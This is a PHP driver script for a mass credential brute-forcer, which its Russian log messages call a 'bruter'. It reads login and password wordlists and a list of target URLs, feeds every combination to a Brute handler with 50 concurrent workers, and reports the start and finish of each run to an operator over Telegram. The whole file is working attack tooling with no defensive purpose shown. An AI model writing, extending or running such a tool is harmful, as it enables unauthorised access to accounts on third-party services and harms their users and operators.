<?php

error_reporting(E_ALL);
ini_set('display_startup_errors', 1);
ini_set('display_errors', 1);
ini_set('memory_limit', '2048M');

require 'vendor/autoload.php';
require 'lib/functions.php';

use Amp\Loop;
use Amp\Producer;
use app\Brute;
use app\dns\Resolver;
use app\Log;
use app\Telegram;
use Monolog\ErrorHandler;
use Amp\Sync\LocalSemaphore;
use function Amp\Dns\resolver;
use function Amp\Sync\ConcurrentIterator\each;

$logins    = array_map('trimRow', file('data/logins.txt'));
$passwords = array_map('trimRow', file('data/passwords.txt'));
$verified  = fopen('data/verified.txt', 'r+') or die('verified.txt not exist!');

ErrorHandler::register(Log::getLogger());
Loop::setErrorHandler([Log::class, 'critical']);
resolver(new Resolver());

$start_date = (new DateTime())->format('Y-d-m H:i:s');
(new Telegram())->sendMessage("Брутер начал работу в {$start_date}.");

Loop::run(function () use ($logins, $passwords) {
    $iterator = new Producer(function ($emit) use ($logins, $passwords) {
        foreach ($logins as $login) {
            foreach ($passwords as $password) {
                $verified  = fopen('data/verified.txt', 'r+');
                try {
                    for ($i = 0; false !== $line = fgets($verified); $i++) {
                        yield $emit([
                            'url'   => trim($line),
                            'login'    => $login,
                            'password' => $password
                        ]);
                    }
                } finally {
                    Log::debug("END OF FILE AT LINE {$i}");
                }
            }
        }
    });

    $brute = new Brute();

    yield each($iterator, new LocalSemaphore(50), $brute);
    Log::debug('Брутер закончил работу.');
    $end_date = (new DateTime())->format('Y-d-m H:i:s');
    (new Telegram())->sendMessage("Брутер закончил работу в {$end_date}.");
});
